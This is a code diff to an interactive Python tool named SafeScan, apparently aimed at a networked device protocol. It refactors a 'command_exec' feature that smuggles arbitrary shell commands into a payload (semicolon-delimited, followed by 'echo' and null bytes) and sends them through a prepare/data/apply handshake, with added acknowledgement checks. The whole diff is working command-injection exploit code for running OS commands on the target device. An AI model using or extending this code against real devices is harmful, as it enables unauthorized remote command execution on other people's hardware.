@@ -70,29 +70,44 @@ class SafeScan(cmd.Cmd):
         finally:
             return True
 
+    def _send_prepared_payload(self, payload):
+        """Send a payload using the prepare/data handshake."""
+        try:
+            prep_header = struct.pack('<II', len(payload), len(payload))
+            self.z.send_command(defs.CMD_PREPARE_DATA, prep_header)
+            self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(f"[!] Prepare-data rejected: {hex(self.z.last_reply_code)} {self.z.last_payload_data}")
+                return False
+
+            self.z.send_command(defs.CMD_DATA, payload)
+            self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(f"[!] Data payload rejected: {hex(self.z.last_reply_code)} {self.z.last_payload_data}")
+                return False
+
+            return True
+        except Exception:
+            traceback.print_exc()
+            return False
+
     def do_command_exec(self, line):
         if not len(line):
             print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards\n")
             return True
         try:
-            payload = b"; " + line.encode() + b"; echo \x00\x00"
+            payload = b"; " + line.encode() + b"; echo\x00\x00"
 
-            # prepare data
-            payload_len = len(payload)
-            self.z.send_command(defs.CMD_PREPARE_DATA,
-                                struct.pack('<II', payload_len, payload_len))
-            self.z.recv_reply()
+            if not self._send_prepared_payload(payload):
+                return True
 
-            # send data
-            self.z.send_command(defs.CMD_DATA, payload)
+            apply_payload = bytearray(struct.pack('<I', 1700))
+            apply_payload.extend(payload)
+            self.z.send_command(110, apply_payload)
             self.z.recv_reply()
-
-            # apply data
-            data = bytearray()
-            data.extend(struct.pack('<I', 1700))
-            data.extend(payload)
-            self.z.send_command(110, data)
-            self.z.recv_reply()
+            if not self.z.recvd_ack():
+                print(f"[!] Command apply rejected: {hex(self.z.last_reply_code)} {self.z.last_payload_data}")
+                return True
 
         except Exception:
             traceback.print_exc()
